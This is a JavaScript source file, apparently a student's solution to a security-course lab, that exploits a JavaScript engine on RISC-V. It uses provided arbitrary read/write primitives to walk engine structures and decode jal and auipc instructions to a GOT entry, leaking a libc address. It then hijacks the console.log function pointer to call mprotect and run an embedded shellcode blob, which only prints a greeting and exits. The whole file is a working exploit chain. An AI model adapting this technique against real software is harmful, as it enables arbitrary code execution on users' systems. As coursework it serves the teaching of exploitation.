/*
 * TODO: Part C solution goes here!
 */

let addrof = cs361s.addrof;
let readmem = cs361s.readmem;
let writemem = cs361s.writemem;
let mprotect_mus_offset = 0x145fde;
let second_stage =
    "\x93\x08\x00\x04\x05\x45\x97\x05\x00\x00\x93\x85\xa5\x01\x13\x06"
  + "\x60\x02\x73\x00\x00\x00\x93\x08\xe0\x05\x01\x45\x73\x00\x00\x00"
  + "\x48\x65\x6c\x6c\x6f\x2c\x20\x4a\x61\x76\x61\x53\x63\x72\x69\x70"
  + "\x74\x20\x65\x78\x70\x6c\x6f\x69\x74\x61\x74\x69\x6f\x6e\x20\x77"
  + "\x6f\x72\x6c\x64\x21\x0a\x00";

//Returns 4-byte word at ptr (takes a number, not a string)
function readHalfWord(ptr) {
	return readmem(ptr);
}

//Returns 8-byte word at ptr (takes a number, not a string)
function readWord(ptr) {
	return readmem(ptr + 4) * Math.pow(2, 32) + readmem(ptr);
}

//Returns 20-bit offset at ptr (takes as number, not a string)
//Most significant bit is sign bit; right shift by 11 because it does multiples of 2
function readOffset(ptr) {
	let halfWord = readHalfWord(ptr);
	return (halfWord >> 12) & 0xfffff;
}

let context_ptr_ptr = addrof(console.log) + 0x30; //where the 8 bytes of ctx are located
let context_ptr = readWord(context_ptr_ptr);
let rt_ptr = readWord(context_ptr + 0x18); //pointer to ctx->rt
let js_def_malloc_usable_size_ptr = readWord(rt_ptr + 0x18); //address of js_def_malloc_usable_size symbol

let jal_ptr = js_def_malloc_usable_size_ptr;
while ((readHalfWord(jal_ptr) & 0x7f) != 0x6f) {
	jal_ptr += 4;
}
let jal_ins = readHalfWord(jal_ptr); //the jal instruction. Parse bits to get the offset

let bin = jal_ins.toString(2);
let jal_imm = bin.substring(0, 1) + bin.substring(12, 20) + bin.substring(11, 12) + bin.substring(1, 11) + "0";
jal_imm = jal_imm.substring(0,1).repeat(11) + jal_imm;
let jal_ofs = jal_ptr + (parseInt(jal_imm, 2) >> 0);

let auipc = (readHalfWord(jal_ofs) >> 12) & 0xfffff;
auipc = auipc << 12;
let ld = readHalfWord(jal_ofs + 4) >> 20;

let got = jal_ofs + auipc + ld;

let mus_addr = readWord(got);

let mprot_addr = mus_addr + mprotect_mus_offset;

let ss_addr = addrof(second_stage) + 0x10;
let true_ss_addr = ss_addr;
let console_addr = addrof(console.log);

writemem(console_addr + 0x30, ss_addr  - (ss_addr % 4096));
writemem(console_addr + 0x34, Math.floor(ss_addr / Math.pow(2, 32)));
writemem(console_addr + 0x38, mprot_addr >> 0);
writemem(console_addr + 0x3c, Math.floor(mprot_addr / Math.pow(2, 32)));


let fl = 2.0237e-320;

console.log.apply(fl);

writemem(console_addr + 0x38, ss_addr >> 0);
writemem(console_addr + 0x3c, Math.floor(ss_addr / Math.pow(2, 32)));
console.log.apply(null);
